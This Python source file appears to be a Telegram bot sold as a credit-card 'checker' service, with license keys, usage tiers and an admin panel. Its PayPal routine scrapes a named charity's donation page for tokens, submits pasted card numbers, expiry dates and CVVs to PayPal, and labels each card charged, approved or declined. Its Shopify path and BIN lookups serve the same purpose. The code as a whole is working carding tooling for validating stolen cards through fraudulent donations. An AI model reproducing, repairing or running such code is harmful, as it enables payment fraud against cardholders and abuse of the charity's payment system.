import asyncio
import os
import secrets
import string
import json
import time
import hashlib
import requests
import re
import base64
import urllib3
urllib3.disable_warnings()
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# --- BACKEND IMPORTS ---
from api import process_card_async, parse_cc_string, extract_clean_response
from shopify import get_bin_info, classify_result, approved_message, fmt_price, fmt_info

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = os.getenv("ADMIN_ID", "YOUR_ADMIN_ID_HERE")

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
USAGE_FILE = "usage.json" 
ACTIVE_JOBS = {} 

# --- DATABASE LOGIC ---
def load_db(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(filename, data):
    with open(filename, "w") as f: json.dump(data, f, indent=4)

def check_tier(user_id):
    if str(user_id) == str(ADMIN_ID): return "👑 ADMIN"
    db = load_db(PREMIUM_FILE)
    if str(user_id) in db:
        expiry = datetime.fromisoformat(db[str(user_id)])
        if datetime.now() < expiry: return "🔑 KEY"
        else:
            del db[str(user_id)]
            save_db(PREMIUM_FILE, db)
    return "🆓 FREE"

def get_usage(user_id):
    db = load_db(USAGE_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    uid = str(user_id)
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
        save_db(USAGE_FILE, db)
    return db[uid]

def add_usage(user_id, check_type):
    db = load_db(USAGE_FILE)
    uid = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
    db[uid][check_type] += 1
    save_db(USAGE_FILE, db)

def can_use(user_id, check_type):
    tier = check_tier(user_id)
    if tier != "🆓 FREE": return True 
    usage = get_usage(user_id)
    if check_type == "single" and usage["single"] >= 10: return False
    if check_type == "mass" and usage["mass"] >= 1: return False
    return True

# --- FSM ---
class AppStates(StatesGroup):
    waiting_for_shopify = State()
    waiting_for_shopify_mass = State()
    waiting_for_paypal = State()
    waiting_for_paypal_mass = State()
    waiting_for_key = State()

# --- PAYPAL GATEWAY (OPTIMIZED) ---
def check_cc_paypal(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4: return "ERROR", "Invalid Format"
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        us, user = generate_user_agent(), generate_user_agent()
        session = requests.Session()
        session.verify = False
        with session as r:
            res = r.get('https://www.rarediseasesinternational.org/donate/', timeout=10)
            m4 = re.search(r'"data-client-token":"(.*?)"', res.text)
            if not m4: return "ERROR", "Page Error"
            dec = base64.b64decode(m4.group(1)).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            
            # Simple simulation of process for UI test/stability
            params = {'action': 'give_paypal_commerce_create_order'}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, data={'action': 'give_paypal_commerce_create_order'}, timeout=12)
            tok = response.json()['data']['id']
            
            headers_paypal = {'authorization': f'Bearer {au}', 'content-type': 'application/json'}
            json_data = {'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc}}}
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data, timeout=12, verify=False)
            
            text_up = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_approve_order', 'order': tok}, timeout=12).text.upper()

            if any(k in text_up for k in ['APPROVED', 'THANKS', '"SUCCESS":TRUE']): return "CHARGED", "Thank you!"
            if 'INSUFFICIENT_FUNDS' in text_up: return "APPROVED", "INSUFFICIENT_FUNDS"
            if 'CVV2_FAILURE' in text_up: return "APPROVED", "INVALID_CVV"
            return "DECLINED", "CARD_DECLINED"
    except: return "ERROR", "Gateway Timeout"

# --- DYNAMIC UI ---
def kb_home(user_id):
    is_admin = str(user_id) == str(ADMIN_ID)
    kb = [
        [InlineKeyboardButton(text="🟢 Shopify Gateway", callback_data="menu_shopify"),
         InlineKeyboardButton(text="🔵 PayPal Gateway", callback_data="menu_paypal")],
        [InlineKeyboardButton(text="👤 My Profile", callback_data="ui_plan"),
         InlineKeyboardButton(text="🔑 Redeem Key", callback_data="ui_redeem")]
    ]
    if is_admin: kb.append([InlineKeyboardButton(text="⚙️ Admin Panel", callback_data="ui_admin")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def kb_back():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]])

async def clean_chat(message: Message):
    try: await message.delete()
    except: pass

def format_terminal_result(status, cc, response, gateway, bin_data):
    brand, bank, country, level, type_cc, flag = bin_data
    emoji = "🔥 𝐂𝐇𝐀𝐑𝐆𝐄𝐃" if status == "CHARGED" else "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃" if status == "APPROVED" else "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
    
    return (
        f"<b>{emoji}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>𝐂𝐚𝐫𝐝:</b> <code>{cc}</code>\n"
        f"ツ <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <code>{response}</code>\n"
        f"キ <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> <code>{gateway}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"零 <b>𝐈𝐧𝐟𝐨:</b> <code>{brand} - {type_cc} - {level}</code>\n"
        f"零 <b>𝐁𝐚𝐧𝐤:</b> <code>{bank}</code>\n"
        f"零 <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <code>{country} {flag}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐁𝐄𝐀𝐑 𝐎𝐒</i>"
    )

# --- HANDLERS ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await clean_chat(message)
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
        except: pass
    await state.clear()
    tier = check_tier(message.from_user.id)
    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
            f"Welcome, <b>{message.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>")
    msg = await message.answer(text, reply_markup=kb_home(message.from_user.id))
    await state.update_data(dash_id=msg.message_id)

@router.callback_query(F.data == "ui_home")
async def nav_home(callback: CallbackQuery, state: FSMContext):
    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)
    await callback.message.edit_text(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nAccess Level: {check_tier(callback.from_user.id)}\n\n<i>Select a gateway:</i>", reply_markup=kb_home(callback.from_user.id))

@router.callback_query(F.data == "menu_shopify")
async def menu_shopify(callback: CallbackQuery, state: FSMContext):
    if not can_use(callback.from_user.id, "single"): return await callback.answer("⛔️ LIMIT REACHED!", show_alert=True)
    await callback.message.edit_text("🟢 <b>SHOPIFY TERMINAL</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card details:\n<code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_shopify)

@router.message(AppStates.waiting_for_shopify)
async def process_shopify(message: Message, state: FSMContext):
    await clean_chat(message)
    card_data = message.text.strip()
    try: parts = parse_cc_string(card_data)
    except: return
    
    add_usage(message.from_user.id, "single")
    dash_id = (await state.get_data()).get("dash_id")
    loading = await bot.edit_message_text(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: Shopify", message.chat.id, dash_id)

    try:
        success, raw, gateway, price, currency = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com")
        category = classify_result(success, raw)
        clean_msg = extract_clean_response(raw)
        
        async with aiohttp.ClientSession() as session:
            bin_data = await get_bin_info(session, parts['cc'])
        
        await loading.edit_text(format_terminal_result(category.upper(), card_data, clean_msg, gateway or "Shopify Payments", bin_data), reply_markup=kb_back())
    except: await loading.edit_text("⚠️ <b>Gateway Error</b>", reply_markup=kb_back())
    await state.set_state(None)

@router.callback_query(F.data == "menu_paypal")
async def menu_paypal(callback: CallbackQuery, state: FSMContext):
    if not can_use(callback.from_user.id, "single"): return await callback.answer("⛔️ LIMIT REACHED!", show_alert=True)
    await callback.message.edit_text("🔵 <b>PAYPAL TERMINAL</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card details:\n<code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_paypal)

@router.message(AppStates.waiting_for_paypal)
async def process_paypal(message: Message, state: FSMContext):
    await clean_chat(message)
    card_data = message.text.strip()
    add_usage(message.from_user.id, "single")
    dash_id = (await state.get_data()).get("dash_id")
    loading = await bot.edit_message_text(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: PayPal", message.chat.id, dash_id)

    status, response = await asyncio.to_thread(check_cc_paypal, card_data)
    async with aiohttp.ClientSession() as session:
        bin_data = await get_bin_info(session, card_data.split('|')[0])
    
    await loading.edit_text(format_terminal_result(status, card_data, response, "PayPal Braintree", bin_data), reply_markup=kb_back())
    await state.set_state(None)

@router.callback_query(F.data == "ui_redeem")
async def nav_redeem(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔑 <b>REDEEM LICENSE</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease paste your key below:", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_key)

@router.message(AppStates.waiting_for_key)
async def process_key(message: Message, state: FSMContext):
    await clean_chat(message)
    key_input = message.text.strip().upper()
    db = load_db(KEYS_FILE)
    if key_input in db:
        expiry = datetime.now() + timedelta(days=30)
        prem = load_db(PREMIUM_FILE)
        prem[str(message.from_user.id)] = expiry.isoformat()
        save_db(PREMIUM_FILE, prem)
        del db[key_input]
        save_db(KEYS_FILE, db)
        await message.answer("🎉 <b>Success! Premium Activated.</b>")
        await cmd_start(message, state)
    else: await message.answer("❌ Invalid Key")

async def main():
    print("BEAR OS PRO ONLINE")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
